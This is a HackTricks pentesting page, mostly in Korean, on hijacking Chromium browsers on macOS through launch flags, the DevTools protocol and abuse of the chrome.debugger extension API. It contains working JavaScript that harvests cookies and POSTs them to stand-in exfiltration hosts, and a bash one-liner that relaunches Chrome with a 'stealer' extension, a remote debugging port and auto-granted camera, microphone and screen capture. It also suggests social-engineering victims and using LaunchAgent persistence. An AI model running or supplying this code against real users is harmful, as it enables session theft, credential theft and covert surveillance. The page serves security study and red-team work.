# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, and Opera는 동일한 command-line switches, preference files, 그리고 DevTools automation interfaces를 사용합니다. macOS에서는 GUI에 접근 가능한 어떤 사용자든 기존 브라우저 세션을 종료하고 대상의 entitlements로 실행되는 임의의 flags, extensions, 또는 DevTools endpoints를 사용해 브라우저를 다시 열 수 있습니다.

#### Launching Chromium with custom flags on macOS

macOS는 Chromium 프로파일당 단일 UI 인스턴스를 유지하므로 보통 계측을 위해 브라우저를 강제 종료해야 합니다(예: `osascript -e 'tell application "Google Chrome" to quit'`). 공격자는 일반적으로 `open -na "Google Chrome" --args <flags>`로 재실행하여 앱 번들을 수정하지 않고 인수를 주입합니다. 해당 명령을 user LaunchAgent(`~/Library/LaunchAgents/*.plist`)나 로그인 훅에 감싸면 변조된 브라우저가 재부팅/로그오프 후에도 재생성되는 것을 보장합니다.

#### `--load-extension` Flag

`--load-extension` 플래그는 unpacked extensions(쉼표로 구분된 경로)을 자동으로 로드합니다. `--disable-extensions-except`와 함께 사용하면 정상적인 확장을 차단하면서 오직 공격자의 페이로드만 실행되게 강제할 수 있습니다. 악성 확장은 `debugger`, `webRequest`, `cookies`와 같은 고권한 permissions를 요청해 DevTools 프로토콜로 전이하거나, CSP 헤더를 패치하고, HTTPS를 다운그레이드하거나, 브라우저 시작 즉시 세션 자료를 유출할 수 있습니다.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

이 스위치는 Chrome DevTools Protocol (CDP)을 TCP나 파이프를 통해 공개하여 외부 툴이 브라우저를 제어할 수 있게 합니다. Google은 이 인터페이스의 widespread infostealer 남용을 관찰했으며, Chrome 136 (March 2025)부터는 브라우저가 비표준 `--user-data-dir`로 실행되지 않는 한 기본 프로파일에 대해 이 스위치를 무시합니다. 이는 실제 프로파일에서 App-Bound Encryption을 강제하지만, 공격자는 여전히 새 프로파일을 생성하고 피해자가 그 안에서 인증하도록 유도(phishing/triage assistance)한 뒤 CDP를 통해 cookies, tokens, device trust states, 또는 WebAuthn registrations를 수집할 수 있습니다.

#### `--user-data-dir` Flag

이 플래그는 전체 브라우저 프로파일(History, Cookies, Login Data, Preference files 등)을 공격자가 제어하는 경로로 리다이렉트합니다. 이는 최신 Chrome 빌드와 `--remote-debugging-port`를 조합할 때 필수이며, 또한 변조된 프로파일을 격리하여 보안 프롬프트를 비활성화하고 확장을 자동 설치하며 기본 스킴을 변경하는 사전 채워진 `Preferences` 또는 `Secure Preferences` 파일을 떨어뜨릴 수 있게 합니다.

#### `--use-fake-ui-for-media-stream` Flag

이 스위치는 카메라/마이크 권한 프롬프트를 우회하여 `getUserMedia`를 호출하는 모든 페이지가 즉시 접근을 받도록 합니다. `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` 같은 플래그나 CDP의 `Browser.grantPermissions` 명령과 결합하면 사용자 상호작용 없이 오디오/비디오를 조용히 캡처하거나 화면 공유를 하거나 WebRTC 권한 검사를 통과시킬 수 있습니다.

## Remote Debugging & DevTools Protocol Abuse

Once Chrome is relaunched with a dedicated `--user-data-dir` and `--remote-debugging-port`, you can attach over CDP (e.g., via `chrome-remote-interface`, `puppeteer`, or `playwright`) and script high-privilege workflows:

- **Cookie/session theft:** `Network.getAllCookies` and `Storage.getCookies` return HttpOnly values even when App-Bound encryption would normally block filesystem access, because CDP asks the running browser to decrypt them.
- **Permission tampering:** `Browser.grantPermissions` and `Emulation.setGeolocationOverride` let you bypass camera/mic prompts (especially when combined with `--use-fake-ui-for-media-stream`) or falsify location-based security checks.
- **Keystroke/script injection:** `Runtime.evaluate` executes arbitrary JavaScript inside the active tab, enabling credential lifting, DOM patching, or injecting persistence beacons that survive navigation.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` and `Fetch.enable` intercept authenticated requests/responses in real time without touching disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

2023년 연구 "Chrowned by an Extension"는 악성 extension이 `chrome.debugger` API를 사용해 어떤 탭에도 attach하고 `--remote-debugging-port`와 동일한 DevTools 권한을 얻을 수 있음을 보여주었습니다. 이는 원래의 격리 가정 (extensions stay in their context)을 깨고 다음을 가능하게 합니다:

- 은밀한 cookie 및 credential theft (`Network.getAllCookies`/`Fetch.getResponseBody`).
- 사이트 권한(camera, microphone, geolocation) 변경 및 security interstitial 우회로 phishing 페이지가 Chrome 대화상자를 가장할 수 있게 함.
- 프로그래밍 방식으로 `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, 또는 `Security.handleCertificateError`를 제어해 TLS 경고, 다운로드, 또는 WebAuthn 프롬프트를 온-패스 변조.

사용자 상호작용 없이 동작하게 하려면 extension을 `--load-extension`/`--disable-extensions-except`와 함께 로드하세요. API를 악용하는 최소한의 background 스크립트 예시는 다음과 같습니다:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
확장은 `Debugger.paused` 이벤트를 구독하여 JavaScript 변수 읽기, 인라인 스크립트 패치, 또는 네비게이션을 거쳐도 유지되는 커스텀 중단점 삽입이 가능합니다. 모든 것이 사용자의 GUI 세션 내에서 실행되기 때문에 Gatekeeper와 TCC가 작동하지 않으며, 이미 사용자 컨텍스트에서 실행을 획득한 악성코드에 이 기법이 적합합니다.

### 도구

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions을 사용해 Chromium 실행을 자동화하고 대화형 CDP 훅을 제공합니다.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS 운영자를 위한 트래픽 가로채기 및 브라우저 계측에 초점을 맞춘 유사 툴링입니다.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` 인스턴스가 활성화되면 Chrome DevTools Protocol 덤프(cookies, DOM, permissions)를 스크립트화하기 위한 Node.js 라이브러리입니다.

### 예제
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
tools links에서 더 많은 예제를 확인하세요.

## 참고자료

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
